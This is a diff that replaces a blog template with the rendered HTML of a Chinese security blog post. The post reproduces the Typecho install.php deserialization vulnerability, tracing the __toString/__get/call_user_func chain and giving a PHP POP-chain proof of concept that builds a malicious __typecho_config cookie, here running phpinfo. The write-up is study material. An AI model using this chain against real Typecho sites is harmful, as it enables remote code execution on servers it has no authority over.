@@ -1,31 +1,200 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>可惜没如果、m0nk3y‘s Blog | 可惜没如果、m0nk3y‘s Blog</title><meta name="keywords" content="漏洞复现"><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="参考文章:  [php对象注入-pop链的构造]   入门教学 | Typecho反序列化漏洞分析 反序列化中(面向对象)几个常见的魔术方法:  __construct():用于对对象的属性进行初始化,使用关键字new实例化对象时自动执行 &#x2F;&#x2F;构造方法 __destruct():用于释放对象占用的第三方资源,对象呗销毁时自动执行&#x2F;&#x2F;析构方法 __toString():用于兼容对象的字符串调用,在对">
+<meta property="og:type" content="article">
+<meta property="og:title" content="可惜没如果、m0nk3y‘s Blog">
+<meta property="og:url" content="https://hack-for.fun/17f4.html">
+<meta property="og:site_name" content="可惜没如果、m0nk3y‘s Blog">
+<meta property="og:description" content="参考文章:  [php对象注入-pop链的构造]   入门教学 | Typecho反序列化漏洞分析 反序列化中(面向对象)几个常见的魔术方法:  __construct():用于对对象的属性进行初始化,使用关键字new实例化对象时自动执行 &#x2F;&#x2F;构造方法 __destruct():用于释放对象占用的第三方资源,对象呗销毁时自动执行&#x2F;&#x2F;析构方法 __toString():用于兼容对象的字符串调用,在对">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2020-08-25T08:45:28.634Z">
+<meta property="article:modified_time" content="2020-08-25T08:45:28.634Z">
+<meta property="article:author" content="m0nk3y">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hack-for.fun/17f4"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
-        
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache:theme.fragment_cache})
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .post-ad!=theme.ad.post
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
 
-    include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2020-08-25 16:45:28'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache:theme.fragment_cache})
-      
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="可惜没如果、m0nk3y‘s Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">97</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">81</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div></div><hr/></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">可惜没如果、m0nk3y‘s Blog</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">No title</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-08-25T08:45:28.634Z" title="Created 2020-08-25 16:45:28">2020-08-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-08-25T08:45:28.634Z" title="Updated 2020-08-25 16:45:28">2020-08-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><a id="more"></a>参考文章:
+
+<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html">php对象注入-pop链的构造</a>]  </p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/155306#h3-5">入门教学 | Typecho反序列化漏洞分析</a></p>
+<p>反序列化中(面向对象)几个常见的魔术方法:</p>
+<blockquote>
+<p>__construct():用于对对象的属性进行初始化,使用关键字new实例化对象时自动执行 //构造方法</p>
+<p>__destruct():用于释放对象占用的第三方资源,对象呗销毁时自动执行//析构方法</p>
+<p>__toString():用于兼容对象的字符串调用,在对象被当成字符串时自动执行 </p>
+<p>__get():调用一个未定义的属性(调用类中私有变量时)时执行这个方法</p>
+<p>__set():给一个未定义的属性赋值时调用</p>
+<p>__call():当调用一个未定义(包括没有权限访问)的方法自动执行</p>
+<p>__sleep():序列化的时候用</p>
+<p>__wakeup():反序列化的时候调用</p>
+</blockquote>
+<!--more-->
+
+
+
+<p>既然是反序列化漏洞,那直接关键字搜索unserialize,结果如下</p>
+<p>而且要有漏洞,那么这个点要么是输入数据可控被输入了危险内容从而getshell,要么就是存在逻辑漏洞导致业务存在漏洞可被利用</p>
+<p>通过这一点,可以大概定位到漏洞所在位置.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">E:\phpstudy_pro\WWW\fx\install.php:</span><br><span class="line">  228                  &lt;?php else : ?&gt;</span><br><span class="line">  229                      &lt;?php</span><br><span class="line">  230:                     $config unserialize(base64_decode(Typecho_Cookie::get(&#39;__typecho_config&#39;)));</span><br><span class="line">  231                      Typecho_Cookie::delete(&#39;__typecho_config&#39;);</span><br><span class="line">  232                      $db &#x3D; new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);</span><br><span class="line">  ...</span><br><span class="line">  281                  &lt;?php else : ?&gt;</span><br><span class="line">  282              &lt;?php</span><br><span class="line">  283:                                     $config &#x3D; unserialize(base64_decode(Typecho_Cookie::get(&#39;__typecho_config&#39;)));</span><br><span class="line">  284                                      $type &#x3D; explode(&#39;_&#39;, $config[&#39;adapter&#39;]);</span><br><span class="line">  285                                      $type &#x3D; array_pop($type);</span><br></pre></td></tr></table></figure>
+
+<p>230~232行:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$config=unserialize(base64_decode(Typecho_Cookie::get(<span class="string">&#x27;__typecho_config&#x27;</span>)));</span><br><span class="line">$db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">&#x27;adapter&#x27;</span>], $config[<span class="string">&#x27;prefix&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>这里将反序列化后的字符串赋值给$config,先从Tyepcho_Cookie类直接调用静态方法get()__typecho_config然后将其base64然后再反序列化</p>
+<p>在install.php中找的代码的位置:</p>
+<p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576597165/6_xaqmtc.png" alt="alt"></p>
+<p>然后将实例化后的字符串赋值给$db,然后234行对Typecho_Db类进行初始化</p>
+<p>然后找到Typecho_DB类,在Db.php中</p>
+<p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576597165/7_j7doxu.png" alt="alt"> </p>
+<p>发现Typecho_DB类通过传入的$adapterName和拼接的typecho_作为参数进行初始化,,,</p>
+<p>如果$adapterName为对象,则会调用__toString方法</p>
+<p>全局搜索__toString方法</p>
+<p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576597166/8_vhzmix.png" alt="8"></p>
+<p>这里程序会调用私有变量所在类的__get()方法获取私有变量</p>
+<p>然后搜索___get()方法, </p>
+<p>__get()方法又调用了get()方法</p>
+<p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576597166/9_o3sqsn.png" alt="9"></p>
+<p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576597166/11_syhovg.png" alt="11"> </p>
+<p>这个switch语句用于检测$key是否在$this-&gt;_parms[$key]里面,如果是,赋值给$value,否则就赋值为$default;最后把$value的值返回给__applyFilter()函数里面</p>
+<p>找到_applyFilter()函数所在的代码</p>
+<p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576597165/12_mni0nq.png" alt="12"></p>
+<p> 这里有两个危险函数:<strong>array_map和call_user_func,这两个系统内置函数将自动为参数调用回调函数;</strong></p>
+<p>$filter为回调函数的名字,$value为参数值,这两个数据都可控;</p>
+<p>因此可以构造序列化攻击,执行我们想要的内容;</p>
+<p>由以上分析,只要参数为数组就会触发__toString方法,然后screenName为执行的参数值, _filter为执行的函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="number">1</span>; <span class="comment">// 执行的参数值</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;phpinfo&#x27;</span>; <span class="comment">//filter执行的函数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">        <span class="keyword">const</span> RSS2 = <span class="string">&#x27;RSS 2.0&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">private</span> $_type;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_type = <span class="built_in">self</span>::RSS2; <span class="comment">//进入toString内部判断条件</span></span><br><span class="line">            $_item[<span class="string">&#x27;author&#x27;</span>] = <span class="keyword">new</span> Typecho_Request(); <span class="comment">//Feed.php文件中触发__get()方法使用的对象</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = $_item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $exp = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line">    $a = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;adapter&#x27;</span>=&gt;$exp, <span class="comment">// Db.php文件中触发__toString()使用的对象</span></span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span> =&gt;<span class="string">&#x27;typecho_&#x27;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">echo</span> urlencode(base64_encode(serialize($a)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个POC我实话实说,写不出来-.- 慢慢学吧<del>~</del></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/17f4.html">https://hack-for.fun/17f4.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/1556.html"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/e91b.html"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info"></div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">m0nk3y</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">97</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">81</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2986.html" title="Recent arrangements"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Recent arrangements"/></a><div class="content"><a class="title" href="/2986.html" title="Recent arrangements">Recent arrangements</a><time datetime="2099-11-01T04:00:00.000Z" title="Created 2099-11-01 12:00:00">2099-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/9b1d.html" title="No title"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="No title"/></a><div class="content"><a class="title" href="/9b1d.html" title="No title">No title</a><time datetime="2099-10-31T16:00:00.000Z" title="Created 2099-11-01 00:00:00">2099-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/62d1.html" title="Chrome 浏览器扩展开发初试"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Chrome 浏览器扩展开发初试"/></a><div class="content"><a class="title" href="/62d1.html" title="Chrome 浏览器扩展开发初试">Chrome 浏览器扩展开发初试</a><time datetime="2020-11-07T05:04:25.000Z" title="Created 2020-11-07 13:04:25">2020-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/558a.html" title="Cobalt Strike"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cobalt Strike"/></a><div class="content"><a class="title" href="/558a.html" title="Cobalt Strike">Cobalt Strike</a><time datetime="2020-11-04T13:33:44.000Z" title="Created 2020-11-04 21:33:44">2020-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/abc8.html" title="2020小组招新有感"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2020小组招新有感"/></a><div class="content"><a class="title" href="/abc8.html" title="2020小组招新有感">2020小组招新有感</a><time datetime="2020-10-23T16:56:04.000Z" title="Created 2020-10-24 00:56:04">2020-10-24</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 By m0nk3y</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
